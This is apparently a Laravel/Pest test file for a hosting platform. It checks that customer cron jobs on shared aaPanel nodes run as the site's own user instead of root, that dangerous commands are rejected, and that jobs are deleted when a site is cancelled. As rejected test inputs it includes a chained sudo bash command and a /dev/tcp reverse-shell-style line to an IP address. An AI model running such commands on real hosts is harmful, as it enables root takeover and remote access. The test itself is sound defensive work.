<?php

declare(strict_types=1);

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Http;
use Onhost\Domain\Provisioning\Models\Operation;
use Onhost\Domain\Services\ServiceFeatures;
use Onhost\Domain\Services\Web\CronCommand;
use Onhost\Providers\AaPanel\AaPanelWebProvider;
use Onhost\Providers\Contracts\Naming;
use Onhost\Providers\Contracts\ResourceRef;
use Onhost\Providers\Shell\ScriptedShell;

/*
 * A scheduled command is a stored instruction somebody else's computer carries out, unattended, for as long as the
 * service lives (Brain card H438) — and when the service ends it has to end with it (H441).
 *
 * Two things were wrong. aaPanel's scheduler IS the node's root crontab: `AddCrontab` has no user field and a
 * `toShell` job is a script the panel daemon runs as root, so the customer's command went in as a root script on a
 * shared node. And `DeleteSite` does not touch the crontab, so a cancelled site's jobs went on firing for ever.
 */

beforeEach(function () {
    Http::preventStrayRequests();
    AaPanelWebProvider::$shellFactory = fn () => new ScriptedShell(['/^id -u /' => "1042\n"]);
});
afterEach(fn () => AaPanelWebProvider::$shellFactory = null);

/** @param array<string,mixed> $rows the crontab the node has; the fake writes into it like the panel does */
function cronPanelFake(array &$rows, array &$calls): void
{
    Http::fake(function ($request) use (&$rows, &$calls) {
        $path = (string) parse_url($request->url(), PHP_URL_PATH).'?'.(string) parse_url($request->url(), PHP_URL_QUERY);
        $body = $request->data();
        $calls[] = [$path, $body];
        if (str_contains($path, 'crontab?action=GetCrontab')) {
            return Http::response(array_values($rows));
        }
        if (str_contains($path, 'crontab?action=AddCrontab')) {
            $rows[] = ['id' => 90 + count($rows), 'name' => $body['name'], 'type' => $body['type'], 'where_hour' => (string) $body['hour'], 'where_minute' => (string) $body['minute'], 'sBody' => $body['sBody'], 'status' => 1];

            return Http::response(['status' => true, 'msg' => 'ok']);
        }
        if (str_contains($path, 'crontab?action=DelCrontab')) {
            $rows = array_values(array_filter($rows, fn (array $r) => (int) $r['id'] !== (int) $body['id']));

            return Http::response(['status' => true, 'msg' => 'deleted']);
        }
        if (str_contains($path, 'data?action=getData&table=sites')) {
            return Http::response(['data' => [['id' => 41, 'name' => 'shop.cz', 'path' => '/www/wwwroot/shop.cz']]]);
        }
        if (str_contains($path, 'site?action=DeleteSite')) {
            return Http::response(['status' => true, 'msg' => 'deleted']);
        }
        if (str_contains($path, 'project/nodejs/get_project_list')) {
            return Http::response(['data' => []]); // no Node.js apps on this site (they are covered by SiteAppsTest)
        }

        return Http::response(['status' => false, 'msg' => "unexpected {$path}"]);
    });
}

it('never gives a scheduled command the node\'s root, and gives the customer their own command back', function () {
    $rows = [];
    $calls = [];
    cronPanelFake($rows, $calls);
    $adapter = aaToolsAdapter();
    $site = new ResourceRef('site', '41', 'aapanel-managed01', ['name' => 'shop.cz', 'path' => '/www/wwwroot/shop.cz'], 'srv_tools');

    $adapter->createCron($site, ['schedule' => '30 2 * * *', 'command' => "php /www/wwwroot/shop.cz/cron.php --it's", 'label' => 'nightly']);

    $body = (string) collect($calls)->last(fn ($c) => str_contains($c[0], 'AddCrontab'))[1]['sBody'];
    expect($body)->not->toStartWith('php ') // it used to BE the command, and aaPanel runs the body as root
        ->and($body)->toContain("/bin/su -s /bin/bash '".Naming::prefix('srv_tools')."ag'") // the site's own user
        ->and($body)->toContain("cd '/www/wwwroot/shop.cz'");
    // the command travels as data inside a quoted here-document, so an apostrophe cannot end the quoting
    expect(AaPanelWebProvider::cronCommandOf($body))->toBe("php /www/wwwroot/shop.cz/cron.php --it's");

    // and what the customer reads back is their own line, not our wrapper
    $listed = $adapter->listCron($site);
    expect($listed[0]['command'])->toBe("php /www/wwwroot/shop.cz/cron.php --it's")->and($listed[0]['confined'])->toBeTrue();
});

it('refuses a command that would take the host apart, and a schedule this panel cannot run', function () {
    [$user, $org] = $this->customerWithOrganization();
    $service = featureWebService($org, 'aapanel');
    $this->actingAs($user, 'sanctum');
    $post = fn (array $params, string $key) => $this->postJson("/v1/services/{$service->id}/actions", ['action' => 'cron.create', 'params' => $params], ['Idempotency-Key' => $key]);

    // one `;` was all it took: the old check only looked at the length of the whole line
    $post(['schedule' => '0 3 * * *', 'command' => 'php cron.php; sudo /bin/bash /tmp/x.sh'], 'c1')
        ->assertUnprocessable()->assertJsonPath('error', 'action_param_invalid');
    $post(['schedule' => '0 3 * * *', 'command' => 'bash -c "cat </dev/tcp/198.51.100.7/4444"'], 'c2')->assertUnprocessable();
    $post(['schedule' => '0 3 * * *', 'command' => 'crontab -l'], 'c3')->assertUnprocessable();
    expect(CronCommand::firstRefused('php artisan schedule:run'))->toBeNull()
        ->and(CronCommand::firstRefused('/usr/bin/curl -s https://example.test/ping && wp cron event run --due-now'))->toBeNull();

    // the panel expresses "every hour at :M" and "every day at H:M" and nothing else — it used to run the rest at the
    // wrong time without a word (`0 3 * * 1`, Mondays, was created as every day at 03:00)
    Http::fake([AAP.'/crontab?action=GetCrontab' => Http::response([])]);
    $weekly = $post(['schedule' => '0 3 * * 1', 'command' => 'php cron.php'], 'c4')->assertAccepted();
    $operation = driveOperation(Operation::query()->findOrFail($weekly->json('operation_id')));
    expect($operation->state)->toBe(Operation::FAILED)
        ->and($operation->error['message'])->toContain('once a day');
});

it('finds a job that is still one of the node\'s root scripts and puts it right', function () {
    [, $org] = $this->customerWithOrganization();
    $service = featureWebService($org, 'aapanel');
    $rows = [['id' => 12, 'name' => "onhost:{$service->id}:legacy", 'type' => 'day', 'where_hour' => '3', 'where_minute' => '0', 'sBody' => 'php legacy.php', 'status' => 1]];
    $calls = [];
    Http::fake(function ($request) use (&$rows, &$calls) {
        $path = (string) parse_url($request->url(), PHP_URL_PATH).'?'.(string) parse_url($request->url(), PHP_URL_QUERY);
        $calls[] = $path;
        if (str_contains($path, 'GetCrontab')) {
            return Http::response(array_values($rows));
        }
        if (str_contains($path, 'modify_crond')) {
            $rows[0]['sBody'] = (string) $request->data()['sBody'];

            return Http::response(['status' => true, 'msg' => 'ok']);
        }

        return Http::response(['status' => false, 'msg' => "unexpected {$path}"]);
    });

    Artisan::call('onhost:services:cron-confine');
    expect(Artisan::output())->toContain('php legacy.php')->toContain('nalezeno')
        ->and($rows[0]['sBody'])->toBe('php legacy.php'); // read-only without --apply

    Artisan::call('onhost:services:cron-confine --apply');
    expect($rows[0]['sBody'])->toContain('/bin/su -s /bin/bash ')->toContain('php legacy.php');
    expect(app(ServiceFeatures::class)->resources($service->fresh(), 'cron', true)[0]['confined'])->toBeTrue();
});

it('takes the site\'s scheduled jobs with it when the service is gone', function () {
    $rows = [
        ['id' => 12, 'name' => Naming::cronLabel('srv_tools', 'nightly'), 'type' => 'day', 'where_hour' => '3', 'where_minute' => '0', 'sBody' => 'php cron.php', 'status' => 1],
        ['id' => 13, 'name' => 'someone else on this node', 'type' => 'day', 'where_hour' => '1', 'where_minute' => '0', 'sBody' => 'php other.php', 'status' => 1],
    ];
    $calls = [];
    cronPanelFake($rows, $calls);
    $adapter = aaToolsAdapter();
    $site = new ResourceRef('site', '41', 'aapanel-managed01', ['name' => 'shop.cz', 'path' => '/www/wwwroot/shop.cz'], 'srv_tools');

    // aaPanel's crontab belongs to the node: DeleteSite takes the files, the databases and the FTP users and leaves the jobs
    expect($adapter->terminate($site)->data['cron_removed'])->toBe(1);
    expect(array_column($rows, 'id'))->toBe([13]); // ours is gone, the neighbour's is untouched
    expect(collect($calls)->contains(fn ($c) => str_contains($c[0], 'DeleteSite')))->toBeTrue();
});
